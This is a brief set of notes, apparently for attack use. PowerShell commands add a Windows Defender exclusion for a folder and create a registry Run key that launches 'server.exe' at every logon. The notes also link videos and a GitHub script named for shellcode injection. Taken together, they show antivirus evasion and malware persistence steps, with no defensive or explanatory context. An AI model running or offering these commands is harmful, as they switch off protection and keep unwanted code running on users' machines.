Add-MpPreference -ExclusionPath "C:\Test" \n
New-ItemProperty `
    -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "Task" `
    -Value '"C:\Program Files\server.exe"' `
    -PropertyType String `
    -Force

https://www.youtube.com/watch?v=bvw3UDmbhYQ
https://www.youtube.com/watch?v=uTX807i8wvA /n
https://github.com/maximilianmarx/shellcode-injection/blob/main/PSInject.ps1
